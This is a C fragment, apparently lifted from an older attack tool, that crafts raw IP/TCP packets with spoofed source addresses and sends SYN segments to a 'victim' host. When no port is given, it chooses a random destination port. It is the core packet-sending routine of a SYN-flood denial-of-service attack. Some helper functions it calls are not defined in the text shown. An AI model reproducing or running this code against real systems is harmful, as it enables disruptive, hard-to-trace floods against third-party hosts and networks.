/*
 that mess was ripped out of void's code ;)
*/

unsigned long send_seq, ack_seq, srcport;
#define SEQ 0x28374839


void send_tcp_segment(struct ip *ih, struct tcphdr *th, char *data,
int dlen) {
  char buf[65536];
  struct {  /* rfc 793 tcp pseudo-header */
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
  } ph;

  struct sockaddr_in sin;

  ph.saddr=ih->ip_src.s_addr;
  ph.daddr=ih->ip_dst.s_addr;
  ph.mbz=0;
  ph.ptcl=IPPROTO_TCP;
  ph.tcpl=htons(sizeof(*th)+dlen);

  memcpy(buf, &ph, sizeof(ph));
  memcpy(buf+sizeof(ph), th, sizeof(*th));
  memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
  memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
  th->th_sum=ip_sum(buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);

  memcpy(buf, ih, 4*ih->ip_hl);
  memcpy(buf+4*ih->ip_hl, th, sizeof(*th));
  memcpy(buf+4*ih->ip_hl+sizeof(*th), data, dlen);
  memset(buf+4*ih->ip_hl+sizeof(*th)+dlen, 0, 4);

  ih->ip_sum=ip_sum(buf, (4*ih->ip_hl + sizeof(*th)+ dlen + 1) & ~1);
  memcpy(buf, ih, 4*ih->ip_hl);
  sin.sin_family=AF_INET;
  sin.sin_port=th->th_dport;
  sin.sin_addr.s_addr=ih->ip_dst.s_addr;

  if(sendto(rawsock, buf, 4*ih->ip_hl + sizeof(*th)+ dlen, 0, (struct sockaddr *)&sin, sizeof(sin))<0) {
    printf("Error sending syn packet.\n"); perror("");
    exit(1);
  }
}

void syn (u_long victim, u_short port)
{
  int i, s;
  unsigned long my_ip;
  struct ip ih;
  struct tcphdr th;
  struct sockaddr_in sin;
  int sinsize;
  unsigned short myport=6969;
  char buf[1024], b[1024];
  struct timeval tv;

  srandom(time(NULL));
  ih.ip_v=4;
  ih.ip_hl=5;
  ih.ip_tos=0;                  /* XXX is this normal? */
  ih.ip_len=sizeof(ih)+sizeof(th);
  ih.ip_id=htons(random());
  ih.ip_off=0;
  ih.ip_ttl=30;
  ih.ip_p=IPPROTO_TCP;
  ih.ip_sum=0;
  ih.ip_src.s_addr=k00lip();
  ih.ip_dst.s_addr=victim;

  srcport = getrandom(1, 1024)+1000;
  th.th_sport=htons(srcport);

  if (port == 0)
        th.th_dport=htons(getrandom(0, 65535));
  else
        th.th_dport=htons(port);
  th.th_seq=htonl(SEQ);
  th.th_off=sizeof(th)/4;
  th.th_ack=(random());
  th.th_flags = 0x02;

  th.th_win=htons(65535);
  th.th_sum=0;
  th.th_urp=(random());

  gettimeofday(&tv, 0);
  send_tcp_segment(&ih, &th, "", 0);
  send_seq = th.th_seq+1+strlen(buf);
}









